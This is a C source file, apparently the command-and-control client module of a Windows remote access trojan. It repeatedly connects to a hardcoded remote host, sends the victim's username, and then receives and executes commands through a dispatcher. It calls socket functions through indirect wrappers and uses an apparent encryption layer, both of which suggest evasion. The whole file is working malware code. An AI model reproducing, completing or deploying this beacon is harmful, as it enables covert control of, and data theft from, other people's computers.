#include <stdio.h>
#include <windows.h>
#include "types.h"
#include "client.h"
#include "SCL2.h"
#include "net/dns.h"
#include "net/interface.h"
#include "net/error.h"
#include "commands/cmds.h"

int client_connected = 0;
ulong client_timeout = 1000;
ulong client_io_block = 0;
ulong client_io_nonBlock = 1;

SOCKET client_Socket = INVALID_SOCKET;
SOCKADDR_IN client_SocketAddr;

void client_Prepare(void)
{
	WSADATA wsaData;
	
	if(net_lib_WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		exit(0);
	}

	client_SocketAddr.sin_addr.s_addr = net_Dns_GetIp(CLIENT_IP);
	client_SocketAddr.sin_family = AF_INET;
	client_SocketAddr.sin_port = net_lib_htons(CLIENT_PORT);
}

void client_Disconnect(void)
{
	if(client_Socket != INVALID_SOCKET)
	{
		net_lib_shutdown(client_Socket, SD_BOTH);
		net_lib_closesocket(client_Socket);
		client_Socket = INVALID_SOCKET;
		client_connected = 0;
	}
}

void client_Connect(void)
{
	client_connected = 0;
	client_Socket = net_lib_socket(AF_INET, SOCK_STREAM, 0);

	char _val1[1] = { 1 };

 	net_lib_setsockopt(client_Socket, SOL_SOCKET, SO_REUSEADDR, _val1, sizeof(int));
 	net_lib_setsockopt(client_Socket, SOL_SOCKET, SO_KEEPALIVE, _val1, sizeof(int));
	net_lib_setsockopt(client_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&client_timeout, sizeof(client_timeout));
	net_SetBuffer(NET_BUFFSIZE);

	if(client_Socket == INVALID_SOCKET)
	{
		net_lib_WSACleanup();

		exit(0);
	}

	while(net_lib_connect(client_Socket, (SOCKADDR*)&client_SocketAddr, sizeof(client_SocketAddr)) < 0){}

	net_lib_ioctlsocket(client_Socket, FIONBIO, &client_io_nonBlock);
	client_connected = 1;
	SCL2_Reset();
}

void client_ConnectionHandle(void)
{
	int rv = 0;
	FD_SET fd;
	uint8 *rmsg;
	ulong buffLen = 124;
	char buff[124 + 1];
	memset(buff, 0, 124 + 1);

	if(GetUserName(buff, &buffLen))
	{
		if(net_SendData((uint8*)buff, buffLen) == NET_LOST_CONNECTION)
		{
			return;
		}
	}
	
	while(client_connected == 1)
	{
		FD_ZERO(&fd);
		FD_SET(client_Socket, &fd);

		if(net_lib_select(0, &fd, NULL, NULL, NULL) < 0)
		{
			continue; //maybe ?
		}

		if(FD_ISSET_NET(client_Socket, &fd))
		{
			rv = net_ReceiveData(&rmsg);

			if(rv == NET_LOST_CONNECTION)
			{
				client_Disconnect();
				free(rmsg);
				
				return;
			}

			if(rmsg[0] == 0x0)
			{
				free(rmsg);

				if(net_SendCmd((uint8*)" ", 1, 0) < 1)
				{
					client_Disconnect();
					
					return;
				}

				continue;
			}

			net_lib_ioctlsocket(client_Socket, FIONBIO, &client_io_block);
			net_lib_setsockopt(client_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&client_timeout, sizeof(client_timeout));

			rv = cmds_Translate(rmsg);
			free(rmsg);

			if(!rv)
			{
				client_Disconnect();
				
				return;
			}else{
				SCL2_SeedUp();
			}

			net_lib_ioctlsocket(client_Socket, FIONBIO, &client_io_nonBlock);
		}
	}
}